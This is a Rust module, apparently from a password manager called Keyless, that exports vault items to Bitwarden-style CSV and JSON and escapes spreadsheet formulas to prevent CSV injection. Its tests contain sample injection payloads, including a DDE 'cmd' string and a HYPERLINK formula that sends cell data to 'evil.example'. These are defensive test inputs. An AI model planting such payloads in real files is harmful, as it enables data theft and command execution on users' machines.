//! Unencrypted exports, for moving to another password manager.
//!
//! - CSV in Bitwarden's layout (`folder,favorite,type,name,notes,fields,
//!   reprompt,login_uri,login_username,login_password,login_totp`), which
//!   Bitwarden, 1Password and Keyless import. Items that are not logins are
//!   written as notes with their fields in the `fields` column, so nothing is
//!   lost.
//! - JSON with every item as Keyless stores it.
//!
//! Both hold every secret in plain text: the app asks for the master password
//! and warns before writing one.
//!
//! A CSV cell a spreadsheet would run as a formula (a website can choose an
//! item's title and user name when it saves a passkey) is written with a
//! leading `'`, which Keyless removes again on import. Passwords, one-time
//! password secrets and notes are written as they are.

use serde::Serialize;

use crate::{
    Error, Result,
    backup::BackupData,
    item::{Category, Field, FieldKind, FieldPurpose, ItemDetails, ItemOverview},
};

const CSV_HEADER: [&str; 11] =
    ["folder", "favorite", "type", "name", "notes", "fields", "reprompt", "login_uri", "login_username", "login_password", "login_totp"];

/// One line per value: a field's value may not contain line breaks in the
/// `fields` column.
fn one_line(value: &str) -> String {
    value.split(['\r', '\n']).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ")
}

/// Whether a spreadsheet would read `value` as a formula that can run
/// something or send data out: anything starting with `=`, and `+`, `-` or
/// `@` followed by a function call or a link to another program. Phone
/// numbers (`+55 11 …`) and handles (`@name`) are left alone.
fn formula(value: &str) -> bool {
    let call = || {
        value.match_indices('(').any(|(i, _)| value[..i].trim_end().chars().next_back().is_some_and(|c| c.is_ascii_alphabetic() || c == '_' || c == '.'))
    };
    match value.chars().next() {
        Some('=' | '\t' | '\r') => true,
        Some('+' | '-' | '@') => value.contains('|') || call(),
        _ => false,
    }
}

/// `value` as a spreadsheet shows it, never run.
fn spreadsheet_safe(value: String) -> String {
    if formula(&value) { format!("'{value}") } else { value }
}

/// Undoes [`spreadsheet_safe`] for a cell read back.
pub(crate) fn from_spreadsheet(value: String) -> String {
    match value.strip_prefix('\'') {
        Some(rest) if formula(rest) => rest.to_string(),
        _ => value,
    }
}

fn row(overview: &ItemOverview, details: &ItemDetails) -> [String; 11] {
    let login = matches!(overview.category, Category::Login | Category::Password);
    let username = details.field_by_purpose(FieldPurpose::Username);
    let password = details.field_by_purpose(FieldPurpose::Password);
    let totp = details.all_fields().find(|f| f.kind == FieldKind::Totp && !f.value.is_empty());
    let main = |f: &Field| login && [username, password, totp].iter().any(|m| m.is_some_and(|m| std::ptr::eq(m, f)));
    let fields = details
        .all_fields()
        .filter(|f| !f.value.is_empty() && !main(f))
        .map(|f| format!("{}: {}", one_line(&f.label), one_line(&f.value)))
        .collect::<Vec<_>>()
        .join("\n");
    let value = |field: Option<&Field>| if login { field.map(|f| f.value.clone()).unwrap_or_default() } else { String::new() };
    [
        spreadsheet_safe(overview.tags.join(", ")),
        if overview.favorite { "1".into() } else { String::new() },
        if login { "login".into() } else { "note".into() },
        spreadsheet_safe(overview.title.clone()),
        details.notes.clone(),
        spreadsheet_safe(fields),
        "0".into(),
        spreadsheet_safe(overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>().join(",")),
        spreadsheet_safe(value(username)),
        value(password),
        value(totp),
    ]
}

pub fn to_csv(data: &BackupData) -> Result<Vec<u8>> {
    let mut writer = csv::Writer::from_writer(Vec::new());
    let fail = |e: csv::Error| Error::Import(format!("CSV export failed: {e}"));
    writer.write_record(CSV_HEADER).map_err(fail)?;
    for item in data.vaults.iter().flat_map(|v| &v.items) {
        writer.write_record(row(&item.overview, &item.details)).map_err(fail)?;
    }
    writer.into_inner().map_err(|e| Error::Import(format!("CSV export failed: {e}")))
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct JsonExport<'a> {
    format: &'static str,
    version: u32,
    #[serde(flatten)]
    data: &'a BackupData,
}

pub fn to_json(data: &BackupData) -> Result<Vec<u8>> {
    let mut value = serde_json::to_value(JsonExport { format: "keyless-export", version: 1, data })?;
    // Attached files are not in the export, so neither are their keys.
    for vault in value["vaults"].as_array_mut().into_iter().flatten() {
        for item in vault["items"].as_array_mut().into_iter().flatten() {
            for attachment in item["details"]["attachments"].as_array_mut().into_iter().flatten() {
                if let Some(entry) = attachment.as_object_mut() {
                    entry.remove("key");
                }
            }
        }
    }
    serde_json::to_vec_pretty(&value).map_err(Error::from)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        backup::{BackupItem, BackupVault},
        import::csv::parse_csv,
        item::ItemUrl,
    };

    fn field(label: &str, kind: FieldKind, value: &str, purpose: Option<FieldPurpose>) -> Field {
        Field { id: label.into(), label: label.into(), kind, value: value.into(), purpose }
    }

    fn sample() -> BackupData {
        let mut login = ItemDetails::default();
        login.fields = vec![
            field("username", FieldKind::Text, "ana@example.com", Some(FieldPurpose::Username)),
            field("password", FieldKind::Concealed, "p,a\"ss\nword", Some(FieldPurpose::Password)),
            field("one-time password", FieldKind::Totp, "otpauth://totp/x?secret=JBSWY3DPEHPK3PXP", None),
            field("recovery", FieldKind::Concealed, "code-1\ncode-2", None),
        ];
        login.notes = "first line\nsecond line".into();
        let mut card = ItemDetails::default();
        card.fields = vec![field("number", FieldKind::CardNumber, "4111111111111111", None), field("expiry date", FieldKind::MonthYear, "05/2027", None)];
        BackupData {
            exported_at: 1,
            vaults: vec![BackupVault {
                name: "Personal".into(),
                description: String::new(),
                items: vec![
                    BackupItem {
                        overview: ItemOverview {
                            title: "Example".into(),
                            category: Category::Login,
                            urls: vec![ItemUrl { href: "https://example.com".into(), ..Default::default() }, ItemUrl { href: "https://example.org".into(), ..Default::default() }],
                            tags: vec!["work".into()],
                            favorite: true,
                            ..Default::default()
                        },
                        details: login,
                    },
                    BackupItem { overview: ItemOverview { title: "Visa".into(), category: Category::CreditCard, ..Default::default() }, details: card },
                ],
            }],
        }
    }

    #[test]
    fn csv_round_trip() {
        let csv = to_csv(&sample()).unwrap();
        let text = String::from_utf8(csv.clone()).unwrap();
        assert!(text.starts_with("folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n"));
        let imported = parse_csv(csv.as_slice(), "Personal").unwrap();
        let items = &imported.vaults[0].items;
        assert_eq!(items.len(), 2);
        let login = &items[0];
        assert_eq!(login.overview.title, "Example");
        assert!(login.overview.favorite);
        assert_eq!(login.overview.tags, ["work"]);
        assert_eq!(login.overview.urls.iter().map(|u| u.href.as_str()).collect::<Vec<_>>(), ["https://example.com", "https://example.org"]);
        assert_eq!(login.details.password(), Some("p,a\"ss\nword"));
        assert_eq!(login.details.username(), Some("ana@example.com"));
        assert!(login.details.all_fields().any(|f| f.kind == FieldKind::Totp && f.value.starts_with("otpauth://")));
        assert!(login.details.all_fields().any(|f| f.label == "recovery" && f.value == "code-1 code-2"));
        assert_eq!(login.details.notes, "first line\nsecond line");
        let card = &items[1];
        assert_eq!(card.overview.category, Category::SecureNote);
        assert!(card.details.all_fields().any(|f| f.label == "number" && f.value == "4111111111111111"));
    }

    #[test]
    fn formulas_are_not_run() {
        for (value, escaped) in [
            ("=HYPERLINK(\"https://x/?\"&J5,\"x\")", true),
            ("+HYPERLINK(\"https://x\")", true),
            ("-cmd|' /C calc'!A0", true),
            ("@SUM(A1:A9)", true),
            ("\tx", true),
            ("+55 (11) 99999-9999", false),
            ("@diego", false),
            ("- shopping list", false),
            ("Example", false),
        ] {
            let safe = spreadsheet_safe(value.to_string());
            assert_eq!(safe.starts_with('\''), escaped, "{value}");
            assert_eq!(from_spreadsheet(safe), value);
        }

        let mut data = sample();
        let item = &mut data.vaults[0].items[0];
        item.overview.title = "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")".into();
        item.details.fields[0].value = "+SUM(1)".into();
        item.details.fields[1].value = "=not-a-formula-but-a-password".into();
        let csv = to_csv(&data).unwrap();
        let text = String::from_utf8(csv.clone()).unwrap();
        assert!(text.contains("\"'=HYPERLINK("));
        assert!(text.contains(",'+SUM(1),=not-a-formula-but-a-password,"));
        let imported = parse_csv(csv.as_slice(), "Personal").unwrap();
        let login = &imported.vaults[0].items[0];
        assert_eq!(login.overview.title, "=HYPERLINK(\"https://evil.example/?\"&J2,\"Open\")");
        assert_eq!(login.details.username(), Some("+SUM(1)"));
        assert_eq!(login.details.password(), Some("=not-a-formula-but-a-password"));
    }

    #[test]
    fn json_has_everything() {
        let mut data = sample();
        data.vaults[0].items[0].details.attachments.push(crate::attachment::Attachment::new("scan.pdf", 10, 1).unwrap());
        let json: serde_json::Value = serde_json::from_slice(&to_json(&data).unwrap()).unwrap();
        assert_eq!(json["format"], "keyless-export");
        assert_eq!(json["vaults"][0]["items"][1]["details"]["fields"][1]["value"], "05/2027");
        // Attachments are listed, without their keys.
        let attachment = &json["vaults"][0]["items"][0]["details"]["attachments"][0];
        assert_eq!(attachment["name"], "scan.pdf");
        assert!(attachment.get("key").is_none());
    }
}
